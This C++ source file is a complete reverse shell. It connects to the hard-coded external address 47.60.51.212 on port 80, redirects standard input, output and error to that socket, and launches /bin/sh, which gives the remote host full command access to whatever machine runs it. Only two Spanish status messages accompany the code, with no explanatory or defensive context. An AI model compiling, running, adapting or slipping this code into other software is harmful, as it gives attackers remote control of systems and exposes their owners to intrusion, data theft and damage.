#include <iostream>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <cstring>

int main() {
    
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in clientAddr;
    clientAddr.sin_family = AF_INET;
    clientAddr.sin_port = htons(80); 
    clientAddr.sin_addr.s_addr = inet_addr("47.60.51.212"); 

    if (connect(sockfd, (struct sockaddr*)&clientAddr, sizeof(clientAddr)) == -1) {
        std::cout << "ERROR. Conexión no establecida." << std::endl;

    } else {
        std::cout << "Conexión establecida." << std::endl;

        dup2(sockfd, 0); 
        dup2(sockfd, 1); 
        dup2(sockfd, 2); 

        close(sockfd);

        const char* args[] = { "/bin/sh", NULL };
        execve("/bin/sh", const_cast<char**>(args), NULL);
    }

    return 0;
}
